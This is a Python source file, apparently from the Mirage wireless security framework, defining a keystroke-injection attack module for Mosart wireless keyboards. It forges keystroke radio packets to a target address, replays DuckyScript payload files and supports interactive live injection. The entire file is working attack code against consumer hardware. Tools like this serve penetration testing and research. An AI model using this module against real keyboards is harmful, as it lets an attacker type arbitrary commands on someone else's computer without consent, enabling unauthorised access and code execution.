from mirage.libs import mosart,utils,io,wireless
from mirage.libs.common.parsers import DuckyScriptParser
from mirage.libs.common.hid import HIDMapping
from mirage.core import module


class mosart_keyinjector(module.WirelessModule):
	def init(self):
		self.technology = "mosart"
		self.type = "attack"
		self.description = "Keystrokes injection module for Mosart keyboard"
		self.args = {
				"INTERFACE":"rfstorm0",
				"TARGET":"",
				"CHANNEL":"36",
				"SYNC":"yes",
				"LOCALE":"fr",
				"TEXT":"",
				"DUCKYSCRIPT":"",
				"INTERACTIVE":"no"
			}

		self.counter = 0

	def checkCapabilities(self):
		return self.emitter.hasCapabilities("INJECTING","SNIFFING_NORMAL")

	def checkInjectionSyncCapabilities(self):
		return self.emitter.hasCapabilities("INJECTING_SYNC")

	def addMosartKeystroke(self,locale="fr",key="a",ctrl=False, alt=False, gui=False,shift=False):
		keystrokes = []
		if key == "\n":
			key = "ENTER"
		hid,mod = HIDMapping(locale=locale).getHIDCodeFromKey(key=key)

		if mod == 0:
			keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=hid,modifiers=0,state="pressed"))
			keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=hid,modifiers=0,state="pressed"))

			self.counter = self.counter + 1 if self.counter + 1 <= 15 else 0
		else:
			keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=0,modifiers=mod,state="pressed"))
			keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=0,modifiers=mod,state="pressed"))
			keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=hid,modifiers=0,state="pressed"))
			keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=hid,modifiers=0,state="pressed"))
			
			self.counter = self.counter + 1 if self.counter + 1 <= 15 else 0	
		keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=hid,modifiers=0,state="released"))
		keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=hid,modifiers=0,state="released"))
		keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=0,modifiers=mod,state="released"))
		keystrokes.append(mosart.MosartKeyboardKeystrokePacket(sequenceNumber=self.counter,address=self.args["TARGET"],hidCode=0,modifiers=mod,state="released"))
		keystrokes.append(wireless.WaitPacket(time=0.4))
		self.counter = self.counter + 1 if self.counter + 1 <= 15 else 0
		return keystrokes

	def addMosartText(self,string="",locale="fr"):
		keystrokes = []
		for letter in string:
			keystrokes += self.addMosartKeystroke(key=letter,locale=locale)

		return keystrokes
	def startMosartInjection(self):
		return []

	def addMosartDelay(self,duration=1000):
		keystrokes = []
		keystrokes.append(wireless.WaitPacket(time=0.0001*duration))
		return keystrokes


	def key(self,key):
		if key == "esc":
			self.stop = True
		else:
			injectedKeystroke = ""
			if key == "space":
				injectedKeystroke = " "
			elif key == "delete":
				injectedKeystroke = "DEL"
			elif key in ["enter","shift","alt","ctrl","backspace","up","down","left","right","f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f12"]:
				injectedKeystroke = key.upper()
			else:
				injectedKeystroke = key
			io.info("Injecting:"+str(injectedKeystroke))
			self.emitter.sendp(*(self.addMosartKeystroke(key=injectedKeystroke)))

	def run(self):
		self.receiver = self.getReceiver(interface=self.args["INTERFACE"])
		self.emitter = self.getEmitter(interface=self.args["INTERFACE"])
		if self.checkCapabilities():
			self.receiver.enterSnifferMode(utils.addressArg(self.args["TARGET"]))
			if self.checkInjectionSyncCapabilities():
				if utils.booleanArg(self.args["SYNC"]):
					self.receiver.enableSync()
				else:
					self.receiver.disableSync()
			else:
				io.warning("Synchronized injection is not supported by this interface, the SYNC parameter will be ignored ...")


			self.receiver.setChannel(utils.integerArg(self.args["CHANNEL"]))

			if self.args["TEXT"] != "":
				keystrokes = self.addMosartText(self.args["TEXT"])
				self.emitter.sendp(*keystrokes)		
				while not self.emitter.isTransmitting():
					utils.wait(seconds=0.1)
				while self.emitter.isTransmitting():
					utils.wait(seconds=0.1)

			elif self.args["DUCKYSCRIPT"] != "":
				parser = DuckyScriptParser(filename=self.args["DUCKYSCRIPT"])
				keystrokes = parser.generatePackets(
					textFunction=self.addMosartText,
					initFunction=self.startMosartInjection,
					keyFunction=self.addMosartKeystroke,
					sleepFunction=self.addMosartDelay
					)
				self.emitter.sendp(*keystrokes)		
				while not self.emitter.isTransmitting():
					utils.wait(seconds=0.1)
				while self.emitter.isTransmitting():
					utils.wait(seconds=0.1)

			elif utils.booleanArg(self.args["INTERACTIVE"]):
				self.stop = False
				self.watchKeyboard()
				while not self.stop:
					utils.wait(seconds=0.5)
				
			return self.ok()
		else:
			io.fail("Interface provided ("+str(self.args["INTERFACE"])+") is not able to inject frames and run in sniffing mode.")
			return self.nok()
